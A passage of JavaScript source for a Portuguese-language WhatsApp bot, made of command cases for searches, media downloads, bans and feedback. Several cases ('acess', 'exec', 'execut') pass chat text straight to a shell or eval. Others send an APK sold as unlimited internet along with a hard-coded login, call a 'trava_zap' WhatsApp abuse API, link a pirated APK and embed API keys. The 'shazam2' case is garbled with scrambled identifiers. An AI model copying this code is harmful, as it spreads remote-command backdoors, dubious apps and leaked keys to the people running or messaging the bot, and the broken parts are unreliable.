if(mimetyp.toLowerCase() == 'txt') mimetyp = 'text/plain'
let Messagemdoc = {
document: fs.readFileSync('./docf.txt'),
mimetype: mimetyp,
jpegThumbnail: await getBuffer(thumbc),
fileName: nomedoc,
fileLength: peso,
headerType: 4,
contextInfo:{
forwardingScore:999,
isForwarded:true,
}
}
conn.sendMessage(from, Messagemdoc, {quoted: selo})
} catch (err) {
console.log(err)
m.reply(`Ops ocorreu um erro`)
}
break

case 'gerarlx':
let buttonMessage = {
document: fs.readFileSync('./base.apk'),
mimetype: 'application/vnd.android.package-archive',
fileName: `🇮‌🇳‌🇹‌🇪‌🇷‌🇳‌🇪‌🇹‌ 🇮‌🇱‌🇮‌🇲‌🇮‌🇹‌🇦‌🇩‌🇦‌`,
fileLength: 5410,
caption: `
➡️ 🎉 Usuario Criado 🎉

➡️🔎 Usuario: Vonke1065

➡️ 🔑 Senha: Vonke1065

➡️ 🎯 Validade: 15/05/2023

➡️ 🕟 Limite: 1


`,
}
return conn.sendMessage(from, buttonMessage, {quoted: selo})
let Messagemdoc = {
document: fs.readFileSync('./base.apk'),
mimetype: mimetyp,
jpegThumbnail: await getBuffer(thumbc),
fileName: nomedoc,
fileLength: peso,
headerType: 4,
contextInfo:{
forwardingScore:999,
isForwarded:true,
}
}
conn.sendMessage(from, Messagemdoc, {quoted: selo})
m.reply(`Ops ocorreu um erro`)
break

case 'antipv':
if (!SoDono) return reply(`Apenas dono pode ativar/desativar essa função..`)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiPv) return reply('Ja esta ativo')
antipv.push('Ativado')
fs.writeFileSync('./datab/usuarios/antipv.json', JSON.stringify(antipv))
reply('🌀 Ativou com sucesso o recurso de Anti Privado 📝')
} else if (Number(args[0]) === 0) {
if (!isAntiPv) return reply('Ja esta Desativado')
pesquisar = 'Ativado'
processo = antipv.indexOf(pesquisar)
while(processo >= 0){
antipv.splice(processo, 1)
processo = antipv.indexOf(pesquisar)
}
fs.writeFileSync('./datab/usuarios/antipv.json', JSON.stringify(welkom))
reply('‼️ Desativou com sucesso o recurso De ANTIPV✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'block':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if(!q.length > 6) return reply("Marque o @ do usuário que deseja bloquear de ele utilizar os comandos, ou o número da fórma que copiar...")
var blcp = q.replace(new RegExp("[()+-/ @+/]", "gi"), "")+"@s.whatsapp.net"
var numblc = ban.indexOf(blcp)
if(numblc >= 0) return reply('*Esse Número ja esta incluso*')
ban.push(blcp)
fs.writeFileSync('./datab/usuarios/banned.json', JSON.stringify(ban))
susp = `🚫@${blcp.split('@')[0]} foi banido e não poderá mais usar os comandos do bot🚫`
conn.sendMessage(from, {text: susp, mentions: [blcp]})
break

case 'unblock':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if(!q.length > 6) return reply("Marque o @ do usuário que deseja desbloquear pra ele utilizar os comandos, ou o número da fórma que copiar...")
var blcp = q.replace(new RegExp("[()+-/ @+/]", "gi"), "")+"@s.whatsapp.net"
var numbl = ban.indexOf(blcp)
if(numbl < 0) return reply('*Esse número não está incluso*')
pesquisar = blcp
processo = ban.indexOf(pesquisar)
while(processo >= 0){
ban.splice(processo, 1)
processo = ban.indexOf(pesquisar)
}
fs.writeFileSync('./datab/usuarios/banned.json', JSON.stringify(ban))
susp = `@${blcp.split('@')[0]} foi desbanido e poderá novamente usar os comandos do bot❎`
conn.sendMessage(from, {text: susp, mentions: [blcp]})
break

case 'blocklist':
jrc = 'ESTA É A LISTA DE NÚMEROS BLOQUEADOS :\n'
for (let benn of ban) {
jrc += `~> @${benn.split('@')[0]}\n`
}
jrc += `Total : ${ban.length}`
conn.sendMessage(from, {text: jrc.trim(), mentions: ban})
break
case 'desbanir': case 'desban':
try {
if (!isPremium && !SoDono) return reply("Só usuário premium pode utilizar este comando!") 
var digitou = args.join(" ")
if (!digitou) return reply(`Cadê o número o qual você deseja desbanir?`)
await fetchJson(`https://zanga-api-04hs.onrender.com/api/trava_zap/desbanirnumero?numero=${digitou}`)
reply(`Olá : ${pushname}, a mensagem foi enviada para o suporte do whatsapp com sucesso bb...\nMensagem: ${q}`) 
} catch (e) {
if(String(e).includes(keyapi)) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break
case 'acess':
if (!SoDono && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
teks = body.slice(7)
exec(teks, (err, stdout) => {
if (err) return conn.sendMessage(from, {text: `root@ALEATORY-BOT:~ ${err}`}, {quoted: info})
if (stdout) {
conn.sendMessage(from, {text: stdout})
}
})
break

case 'bangp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (isBanchat) return reply(`Este grupo ja está banido`)
bancht.push(from)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`*Grupo banido com sucesso...*`)
break


case 'unbangp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
let cur = bancht.indexOf(from)
bancht.splice(cur, 1)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`*Grupo desbanido...*`)
break

case 'limitec_global':
case 'limitec':
if(!SoDono && !isnit && !ischyt) return reply(enviar.msg.donosmt)
if (args.length < 1) return
if(budy.includes("limitec")) {
lmt = args[0]
limitecaracteres_ = {
limite: lmt
}
if(!fs.existsSync(`./func/limitecaracteres/limite-c_${from}.json`)) {
fs.writeFileSync(`./func/limitecaracteres/limite-c_${from}.json`, JSON.stringify(limitecaracteres_, null, 2))
reply(`${q} foi adicionado como limite de caracteres..`)
} else {
fs.unlinkSync(`./func/limitecaracteres/limite-c_${from}.json`)
fs.writeFileSync(`./func/limitecaracteres/limite-c_${from}.json`, JSON.stringify(limitecaracteres_, null, 2))
reply(`foi alterado o limite de caracteres para : ${q}`)
}
} else {
limitefl = args.join(" ")
limitefll.limitefl = limitefl
fs.writeFileSync('./datab/usuarios/flood.json', JSON.stringify(limitefll, null, '\t'))
reply(`${q} foi adicionado como limite de caracteres!!`)
}
break

case 'execut':
if(!SoDono  && !isnit && !issupre && !ischyt) return
try{
return eval(`(async() => { ${args.join(' ')}})()`)
} catch (e) {
reply(`${e}`)
}
break

case 'exec':
if(!SoDono  && !isnit && !issupre && !ischyt) return
try{
paramsQuoted = info.message.extendedTextMessage.contextInfo.quotedMessage.conversation || info.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;	
return eval(`${paramsQuoted}`)
console.log(`[EXEC]~> ${paramsQuoted}`)
}catch(e){
reply(e)
}
break

case 'sender':
bla = isGroup ? info.key.participant : info.key.remoteJid
reply(bla)
break
case 'bateria':
reply('《 *Aguarde, esta informação é apenas para saber a porcentagem da bateria do celular do Bot* 》')  
if (!q) return reply(enviar.wrongFormat)
image = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=3cc9f12191b34155a619851c3cf338a6&wait_until=page_loaded&url=https://zangaapis.herokuapp.com/api/maker/bateria?texto=bateria%20%20Luix%20Bot&porcentagem=70&apikey=Luix`)
reply(enviar.espere)
if(q == undefined || q == ' ') return reply(`*Resultado da pesquisa : ${q}*`)
googleIt({ 'query': q }).then(results => {
vars = `_*Resultado da pesquisa : ${q} *_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Título:* ${results[i].title}\n\n*Descrição:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
conn.sendMessage(from, {image, caption: vars})
}).catch(e => {
console.log(e)
reply(`${e}`)
})
break

case 'bateria':
reply('《 *Aguarde, esta informação é apenas para saber a porcentagem da bateria do celular do Bot* 》')  
anu = await getBuffer(`https://zangaapis.herokuapp.com/api/maker/bateria?texto=bateria%20%20Luix%20Bot&porcentagem=70&apikey=Luix`)
conn.sendMessage(from, anu, {quoted: { key: { participant: `0@s.whatsapp.net`, ...{}}, message: { "imageMessage": { "caption": `70%🔋`,}}}})
break
case 'ping2': {
            reply('Testando velocidade da internet do ip onde estou hospedada, aguarde...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = console.log('cd funções && python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) reply(stdout)
        if (stderr.trim()) reply(stderr)
            }
            }
            break
case 'dados':
case 'ping':
r = (Date.now() / 1000) - info.messageTimestamp
uptime = process.uptime()
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
bla = `
┏─────── ─ ━
┃ 𝑇𝑒𝑚𝑝𝑜 𝑂𝑛-𝑙𝑖𝑛𝑒: 
┣•  ${kyun(uptime)}
┃
┣• 𝑉𝑒𝑙𝑜𝑐𝑖𝑑𝑎𝑑𝑒: ${String(r.toFixed(3))}
┃
┣• ${!isGroup ? `𝑈𝑠𝑢𝑎𝑟𝑖𝑜: ${pushname}` :  `𝐺𝑟𝑢𝑝𝑜: ${groupName}`}
┃
┣• ${NomeDoBot}
┃
┣• 𝐻𝑜𝑟𝑎: ${hora1} 
┃
┗─────── ─ ━
`
await conn.sendMessage(from, {text: bla}, {quoted: selo})
break

case 'gtts':
if (args.length < 1) return conn.sendMessage(from,{text: `Cade o texto?, digite algo Exemplo:\n${prefix}gtts PT Oi`}, {quoted: info})
const gtts = require('./armor/funcoes/gtts')(args[0])
if (args.length < 2) return conn.sendMessage(from, {text: 'Falta colocar o código do idioma!'}, {quoted: info})
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
if(dtt.length > 200) return reply('Para reduzir spam o máximo de letras permitidas são 200!')
gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buffer = fs.readFileSync(rano)
conn.sendMessage(from, {audio: buffer, ptt:true}, {quoted: info})
fs.unlinkSync(rano)
})
})
break

case 'tagme':
const tagme = `@${sender.split("@")[0]} ✔️`
await mentions(tagme, [sender], true)
break

case 'blockcmd':
if(!SoDono  && !isnit) return reply(enviar.msg.donosmt)
tp = args.join(" ")
if(tp.includes("blockcmd blockcmd") || (tp.includes("blockcmd  blockcmd"))) return reply(`Tá louco maluco?, Quer banir o comando de bloquear comando?`)
if(getComandoBlock(from).includes(args[0]))return reply('Este comando já está blockeado')
addComandos(from, args[0])
reply(`O comando ${args[0]} Foi blockeado`)
break

case 'unblockcmd':
if(!SoDono  && !isnit) return reply(enviar.msg.donosmt)
tp = args.join(" ")
if(tp.includes("blockcmd unblockcmd") || (tp.includes("blockcmd  unblockcmd"))) return reply(`Tá louco maluco?, Quer banir o comando de desbloquear comando?`)  
if(!getComandoBlock(from).includes(args[0]))return reply('Este comando já está  desbloqueado')
deleteComandos(from, args[0])
reply(`O comando ${args[0]} Foi desblockeado`)
break

case 'listacomandos':
tkks = '╭─*「 *COMANDOS BLOCK* 」\n'
for (let V of getComandoBlock(from)) {
tkks += `│+  ${V}\n`
}
tkks += `│+ Total : ${getComandoBlock(from).length}\n╰──────*「 *${NomeDoBot}* 」*────`
await conn.sendMessage(from, tkks.trim(), extendedText, {quoted: info})
break

case 'avalie':
const avalie = body.slice(8)
if (args.length <= 1) return reply(`Exemplo: ${prefix}avalie "Bot muito bom, parabéns. "`)
if (args.length >= 400) return conn.sendMessage(from, {text: 'Máximo 400 caracteres'}, {quoted: info})
var nomor = info.participant
tdptls = `[ Avaliação ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n: ${avalie}`
await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: tdptls }, {quoted: info})
reply("mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.")
break

case 'bug':
const bug = body.slice(5)
if (args.length <= 1) return reply(`Exemplo: ${prefix}bug "ocorreu um erro no comando sticker"`)
if (args.length >= 800) return conn.sendMessage(from, {text: 'Máximo 800 caracteres'}, {quoted: info})
var nomor = info.participant
teks1 = `[ Problema ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nErro ou bug: ${bug}`
await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: teks1}, {quoted: info})
reply("mensagem enviada ao meu dono, se enviar muitas mensagens repetida por zoueiras, você sera banido de utilizar os comandos do bot.")
break
case 'reportar':
const reportar = body.slice(5)
if (args.length <= 1) return reply(`Exemplo: ${prefix}reportar "@Fulano invou um link"`)
if (args.length >= 800) return conn.sendMessage(from, {text: 'Máximo 800 caracteres'}, {quoted: info})
var nomor = info.participant
teks1 = `『 ALERTA GRUPO 』\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n Reportagem: ${reportar}`
await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: teks1}, {quoted: info})
reply("NICE MENSAGEM FOI ENCAMINHADA PARA OS ADMINS")
break
case 'sugestão':
case 'sugestao':
const sugestao = body.slice(10)
if (args.length <= 1) return reply(`Exemplo: ${prefix}sugestao "Opa, crie um comando tal, que ele funcione de tal maneira, isso será muito bom, não só pra mim, mas pra vários fazer isso.."`)
if (args.length >= 800) return conn.sendMessage(from, {text: 'Máximo 800 caracteres'}, {quoted: info})
var nomor = info.participant
sug = `[ Sugestões ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n: ${sugestao}`
await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: sug}, {quoted: info})
reply("mensagem enviada ao meu dono, obrigado pela sugestão, tentar ouvir o máximo possível de sugestões.")
break

//==========(BAIXAR/PESQUISAS)==========\\
case 'google':
if (!q) return reply(enviar.wrongFormat)
image = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=966a90a8125c4862b276f23068b56fd6&url=https://google.com/search?q=${q}`)
reply(enviar.espere)
if(q == undefined || q == ' ') return reply(`*Resultado da pesquisa : ${q}*`)
googleIt({ 'query': q }).then(results => {
vars = `_*Resultado da pesquisa : ${q} *_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Título:* ${results[i].title}\n\n*Descrição:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
conn.sendMessage(from, {image, caption: vars})
}).catch(e => {
console.log(e)
reply(`${e}`)
})
break
case 'pixid':
if (!q) return reply(enviar.wrongFormat)
image = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=966a90a8125c4862b276f23068b56fd6&url=https://pix.tecnospeed.com.br/sandbox/pix/charge/${q}`)
reply(enviar.espere)
if(q == undefined || q == ' ') return reply(`*Resultado da pesquisa : ${q}*`)
googleIt({ 'query': q }).then(results => {
vars = `_*Resultado da pesquisa : ${q} *_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Título:* ${results[i].title}\n\n*Descrição:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
conn.sendMessage(from, {image, caption: vars})
}).catch(e => {
console.log(e)
reply(`${e}`)
})
break
case 'printsite':
if (!q) return reply(enviar.wrongFormat)
image = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=966a90a8125c4862b276f23068b56fd6&url=${q}`)
reply(enviar.espere)
if(q == undefined || q == ' ') return reply(`*Resultado da pesquisa : ${q}*`)
googleIt({ 'query': q }).then(results => {
vars = `_*Resultado da pesquisa : ${q} *_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Título:* ${results[i].title}\n\n*Descrição:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
conn.sendMessage(from, {image, caption: vars})
}).catch(e => {
console.log(e)
reply(`${e}`)
})
break
case 'clima2':
if (!q) return reply(enviar.wrongFormat)
image = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=966a90a8125c4862b276f23068b56fd6&url=https://www.cptec.inpe.br/previsao-tempo/sp/${q}`)
reply(enviar.espere)
if(q == undefined || q == ' ') return reply(`*ESTE E O CLIMA DE ${q}👻*`)
googleIt({ 'query': q }).then(results => {
vars = `_*Resultado do clima : ${q}*_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Título:* ${results[i].title}\n\n*Descrição:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
conn.sendMessage(from, {image, caption: vars})
}).catch(e => {
console.log(e)
reply(`${e}`)
})
break
case 'clima3':
if (!q) return reply(enviar.wrongFormat)
image = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=966a90a8125c4862b276f23068b56fd6&url=https://tempoagora.uol.com.br/previsao-do-tempo/cidade/397/${q}`)
reply(enviar.espere)
if(q == undefined || q == ' ') return reply(`*ESTE E O CLIMA DE ${q}👻*`)
googleIt({ 'query': q }).then(results => {
vars = `_*Resultado do clima : ${q}*_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Título:* ${results[i].title}\n\n*Descrição:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
conn.sendMessage(from, {image, caption: vars})
}).catch(e => {
console.log(e)
reply(`${e}`)
})
break
case 'amazon':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://apis.nezsab-apis.xyz/api/amazon?nome=${q}&apikey=${Luix1397}`)
.then(e => {
try{
d = e.data.pesquisa.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🛍️ Produto: ${i.titulo}\n× 💸 Preço: ${i.valor}\n× 🔗 Link: ${i.link}\n\n`;
}
conn.sendMessage(from, {image:{url: e.data.pesquisa.resultado[0].imagem}, caption:txt})
}catch(err){
reply(`<❌️> Produto não encontrado. Tente novamente!`)
}
}).catch(err => {
reply('<❌️> Ops, erro na api ao puxar os dados.')
console.log(err);
});
break

case 'mercadolivre': case 'mlsrc':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://apis.nezsab-apis.xyz/api/mercadolivre?nome=${q}&apikey=apikey_LuixxLindo-2023`)
.then(e => {
try{
d = e.data.pesquisa.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🛍️ Produto: ${i.produto}\n× 💸 Preço: ${i.valor}\n× 🔗 Link: ${i.link}\n\n`;
}
conn.sendMessage(from, {image:{url: e.data.pesquisa.resultado[0].imagem}, caption:txt})
}catch(err){
reply(`<❌️> Produto não encontrado. Tente novamente!`)
}
}).catch(err => {
reply('<❌️> Ops, erro na api ao puxar os dados.')
console.log(err);
});
break
case 'pinterest':
let buttonss = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐎📜'}, type: 1}]
                    try {
if(!q) return reply(`Exemplo: ${prefix+command} naruto`)
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/pinterest?nome=${q}&apikey=@Luix1397`, buttons = [
{buttonId:`${prefix}pinterest ${q}`, buttonText: {displayText:`PROXIMO➡️`}, type: 1}]);
conn.sendMessage(from, {image: {url: ABC[Math.floor(Math.random() * ABC.length)]}}).catch(() => {
return reply("Erro..");
})
} catch (e) {
return reply("Erro..");
}
break
case 'zarchive':
reply('*Enviando o zarchive versão pro💎*')
zarchi = 'https://www.mediafire.com/file/1zoqguo9x5zkapx/ZArchiver_Pro_base.apk/file'
const arquiv = await mediafireDl(zarchi)
conn.sendFileFromUrl(arquiv[0].link, {mimetype: arquiv[0].mime, filename: arquiv[0].nama, quoted: selo2})
break

case 'videourl':
case 'gerarlink':
case 'videopralink':
case 'imgpralink':
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) { 
reply(enviar.espere)
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
reply(res) 
} else if ((isMedia && info.message.videoMessage.seconds < 30 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 30) && args.length == 0) { 
reply(enviar.espere)
boij = isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : info.message.videoMessage
owgi = await getFileBuffer(boij, 'video')
res = await upload(owgi)
reply(res)
} else {
reply("Você deve marcar uma imagem, ou um vídeo de até 30 segundos..")
}
} catch {
reply('Ocorreu algum Error, desculpe 😔/ O limite do tamanho de vídeo que gero o link, é até 30 segundos.')
}
break

case 'test':
now_ms = moment.tz('America/Sao_Paulo').format('mm:ss');
now_mn = moment.tz('America/Sao_Paulo').format('mm');
now_sc = moment.tz('America/Sao_Paulo').format('ss');
var limit = JSON.parse(fs.readFileSync("./limitador.json"))
limitnm = "10"
if(!JSON.stringify(limit).includes(sender)) {
blak = parseInt(`${now_sc}+10`)
limit.push({
id: [from+"-"+sender], 
hr: `${now_mn+":"+blak}`
})
fs.writeFileSync("./limitador.json", JSON.stringify(limit))
}
blc = []
for (i of limit) {blc.push(i.id)}
if(now_ms < limit[blc.indexOf(idgp)].hr) return reply(`Aguarde ${limitnm}segundos e tente novamente..`)
reply("oi")
limit[blc.indexOf(sender)].splice(sender, 1)
break
case 'shazam2': ////BY ALIZINN-DEV
{
let mime = (qmsg || q).xmimetype || ''
if (/audioz|video/.texst(mime)) {
let media = await q.dowxnload()
let ext = mime.split('/')[1]
fs.writseFileSync(`./tmp/${m.sender}.${ext}`, mediama)
let res = await acr.identify(fs.readsFileSync(`./tmp/${m.sender}.${ext}`))
let { scode, msg } = res.status
if (code !== 0) throw msg
let { title, artists, album, z, release_date } = resz.metadata.music[0]
let txzt = `
𝚁𝙴𝚂𝚄𝙻𝚃𝙰𝙳𝙾𝚂 𝙳𝙴 𝙻𝙰 𝙱𝚄𝚂𝚀𝚄𝙴𝙳𝙰

• 📌 𝚃𝙸𝚃𝚄𝙻𝙾: ${titlze}
• 👨‍🎤 𝙰𝚁𝚃𝙸𝚂𝚃𝙰: ${artists !== unzdefined ? artists.mzap(v => v.name).join(', ') : 'NÃO ENCONTRADO'}
• 💾 𝙰𝙻𝙱𝚄𝙼: ${album.name || 'NÃO ENCONTRADO'}
• 🌐 𝙶𝙴𝙽𝙴𝚁𝙾: ${genrezs !== undefined ? genres.map(v => v.name).join(', ') : 'NÃO ENCONTRADO'}
• 📆 𝙻𝙰𝙽𝙲𝙰𝙼𝙴𝙽𝚃𝙾: ${relezase_date || 'NÃO ENCONTRADO'}
`.trim()
reply(txt)
} else throw '*[❗𝐈𝐍𝐅𝐎❗] ÁUDIO*'
}
break
case'shazam':{
if (!isQuotedAudio) return enviar('*『👻』 CADE O AUDIO MEU LINDO*')
let music = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, 'audio')
let mime = (quoted.info || quoted).mimetype || ""
let m = mime.split('/')[1]
fs.writeFileSync('./armor/js/' + sender + '.' + m, music)
let base64 = fs.readFileSync('./armor/js/' + sender + '.' + m, { encoding: "base64" })
try {
let datrcS = await arcloud(base64)
var res = await yts(datrcS[0].titulo)
} catch (e) {
reply ('*『🌪️』MUSICA NAO ENCONTRADA*')
}
let buttons = [
{
buttonId: `${prefix}ytmp3 ${res.all[0].url}`, 
buttonText: 
{
displayText: '『🎵』 ᴀᴜᴅɪᴏ'
}, 
type: 1 
},
{
buttonId: `${prefix}Ytmp4 ${res.all[0].url}`, 
buttonText: 
{
displayText: '『🎬』 ᴠɪᴅᴇᴏ'
}, 
type: 1 
}
]
let thumb = await getBuffer(res.all[0].thumbnail)
let tmpe = {
document: { url: "https://wa.me/5516997357601" }, 
mimetype: 'application/vnd.ms-excel', 
fileName: `${NomeDoBot}`, 
caption: `
*➛『🧙‍♂️』 ✰͜͡𝐓𝐢𝐭𝐮𝐥𝐨 : _${res.all[0].title}_*
*➛『⏳』 ✰͜͡𝐃𝐮𝐫𝐚ç𝐚𝐨 : _${res.all[0].timestamp}_*
*➛『👁️‍🗨️』 ✰͜͡𝐕𝐢𝐞𝐰𝐬 : _${res.all[0].views}_*
*➛『👻』 ✰͜͡𝐂𝐚𝐧𝐚𝐥 : _${res.all[0].author.name}_*
*➛『🔗』 ✰͜͡ʟɪɴᴋ : _${res.all[0].url}_*`.trim(),
fileLength: '99999999999999', 
mentions: [sender], 
footer: '', 
buttons: buttons, 
headerType: 4, 
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${res.all[0].title}`, 
mediaType: 2, 
previewType: 'Video',
thumbnail: thumb, 
mediaUrl: `${res.all[0].url}`, 
sourceUrl: 'https://youtu.be/cTc5ywcnWJw'
}
}
} 
conn.sendMessage(from, tmpe, {quoted: selo})
fs.unlinkSync('./armor/js/' + sender + '.' + m)
}
break
case 'play':
conn.sendMessage(from, { react: { text: `⏳️`, key: info.key }})
if(!q) return reply(`- Exemplo: ${prefix}play nome da música\na música será baixada, só basta escolher áudio ou vídeo, se não baixar, o YouTube privou de não baixarem, ou algo do tipo..`)
res = await yts(q)
if(res.all[0].timestamp.length >= 7) return reply("Desculpe, este video ou audio é muito grande, não poderei realizar este pedido, peça outra música abaixo de uma hora.")
reply(enviar.espere)
sendMsg = await conn.sendMessage(from, {react: {text: `✅️`, key: info.key}})
if(botoes === false) {
  rply(`Se essa mensagem está sendo enviada, provavelmente os botões estão desligado, caso queira baixar um vídeo ou audio do play, vou da os exemplos ->\n\nExemplo video: ${prefix}ytmp4 ${q}\n\nExemplo audio: ${prefix}ytmp3 ${q}`)
} else {
bla = `
╔═══『👻』 ${NomeDoBot} 『👻』
╠ _➛ ✰͜͡𝐓𝐢𝐭𝐮𝐥𝐨: ${res.all[0].title}
╠ _➛ ✰͜͡𝐩𝐞𝐬𝐪𝐮𝐢𝐬𝐚: ${q}
╠ _➛ ✰͜͡𝐕𝐢𝐞𝐰𝐬: ${res.all[0].views}
╠ _➛ ✰͜͡𝐃𝐮𝐫𝐚ç𝐚𝐨: ${res.all[0].timestamp}
╠ _➛ ✰͜͡𝐂𝐚𝐧𝐚𝐥: ${res.all[0].author.name}
╚═══『👻』${NomeDoBot} 『👻』`

sendBimg(from, `${res.all[0].image}`, bla, NomeDoBot, [
{buttonId: `${prefix}ytmp3 ${res.all[0].url}`, buttonText: {displayText: `『🎵』𝐁𝐀𝐈𝐗𝐀𝐑-𝐀𝐔𝐃𝐈𝐎`}, type: 1}, {buttonId: `${prefix}ytmp4 ${res.all[0].url}`, buttonText: {displayText: `『🎥』𝐁𝐀𝐈𝐗𝐀𝐑-𝐕𝐈𝐃𝐄𝐎`}, type: 1}], info)
}
break 
case 'audio': case 'ytaudio':
reply('*Espere um pouco ja estou mandando seu audio*')
bla = await fetchJson(`https://api.brizaloka-api.tk/sociais/v2/ytplaymp3?apikey=brizaloka&query=${q}`) 
audbla = bla.link_src
conn.sendMessage(from, { audio: { url: audbla }, mimetype: 'audio/mp4'}, {quoted: selo})
break
case 'video': case 'ytvideo':
reply('*Isso pode demorar um pouco*')
dlk = await fetchJson(`https://api.brizaloka-api.tk/sociais/v2/ytmp4?apikey=brizaloka&url=${q}`);
Op = dlk.video
conn.sendMessage(from, { video: { url: Op }}, {quoted: selo});   
break
 
case 'twitter':
if(!q.includes("twitter")) return reply(`Ops, insira o link, só baixo vídeos / audios do a${command} com link`)
sendBtext(from, "✔️ Download De Vídeo / Audio [ TWITTER ]\nEscolha uma opção que deseja baixar.", `☂️`, [
{buttonId: `${prefix}twitter_video ${q}`, buttonText: {displayText: `🎥 Video`}, type: 1},
{buttonId: `${prefix}twitter_audio ${q}`, buttonText: {displayText: `🎵 Audio`}, type: 1}], selo)
if(botoes === false) {
  rply(`Se essa mensagem está sendo enviada, provavelmente os botões estão desligado, caso queira baixar um vídeo ou audio do Twitter, vou da os exemplos ->\n\nExemplo_video: ${prefix}twitter_video ${q}\n\nExemplo_audio: ${prefix}twitter_audio ${q}`)
}
break 
case 'twitter_video':
try {
if(!q.includes("twitter")) return reply(`Exemplo: ${prefix+command} o link do Twitter`);
reply(enviar.espere)
conn.sendMessage(from, {video: {url: `http://apis.bronxyshost.com/api-bronxys/twitter_video?url=${q}&apikey=@Luix1397`}, mimetype: "video/mp4"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break
case 'twitter_audio':
try {
if(!q.includes("twitter")) return reply(`Exemplo: ${prefix+command} o link do Twitter`);
reply(enviar.espere)
conn.sendMessage(from, {audio: {url: `http://apis.bronxyshost.com/api-bronxys/twitter_audio?url=${q}&apikey=@Luix1397`}, mimetype: "audio/mp4"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break
case 'facebook':
if(!q.includes("fb.watch")) return reply(`Ops, insira o link, só baixo vídeos / audios do ${command} com link de formato fb.watch`)
sendBtext(from, "✔️ Download De Vídeo / Audio [ FACEBOOK ]\nEscolha uma opção que deseja.", `☂️`, [
{buttonId: `${prefix}face_video ${q}`, buttonText: {displayText: `🎥 Video`}, type: 1},
{buttonId: `${prefix}face_audio ${q}`, buttonText: {displayText: `🎵 Audio`}, type: 1}], selo)
if(botoes === false) {
  rply(`Se essa mensagem está sendo enviada, provavelmente os botões estão desligado, caso queira baixar um vídeo ou audio do Facebook, vou da os exemplos ->\n\nExemplo_video: ${prefix}face_video ${q}\n\nExemplo_audio: ${prefix}face_audio ${q}`)
}
break 
case 'face_video':
try {
